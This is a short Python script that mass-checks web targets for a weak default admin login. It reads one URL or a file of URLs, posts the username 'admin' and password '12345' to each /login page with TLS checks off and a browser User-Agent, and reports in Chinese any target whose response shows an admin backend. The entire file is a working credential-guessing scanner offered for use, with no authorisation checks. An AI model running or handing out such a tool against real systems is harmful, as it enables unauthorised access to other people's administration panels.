"""
Author:adminsec
Date:2021-11-4
Last Edit:2021-11-5
"""
import requests
import argparse
import urllib3

urllib3.disable_warnings()

header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61'
}

data = {
    'username': 'admin',
    'password': '12345'
}


description = "Please use a valid parameter"
parser = argparse.ArgumentParser(description=description)
parser.add_argument('-u', type=str, help="Target URL", dest="url", default='')
parser.add_argument('-f', type=str, help="Targets File Path", dest="File_Path", default='')
args = parser.parse_args()
file = args.File_Path


def url_check():
    url = str(args.url) + "/login"
    response = requests.post(url=url, data=data, headers=header, verify=False)
    if "后台管理" in response.text:
        print(url + " 存在弱口令漏洞！！！")


def urls_check():
    with open(file, "r") as fu:
        lines = fu.readlines()
        for line in lines:
            url = str(line.strip()) + "/login"
            try:
                response = requests.post(url=url, data=data, headers=header, verify=False)
                if "后台管理" in response.text:
                    print(url + " 存在弱口令漏洞！！！")
            except ValueError:
                continue
            except requests.exceptions.ConnectionError:
                continue


def run():
    if args.url != '' and file == '':
        url_check()
    elif file != '' and args.url == '':
        urls_check()
    else:
        print("-u 和 -f 参数至少/多选择一个")
        exit()


if __name__ == '__main__':
    run()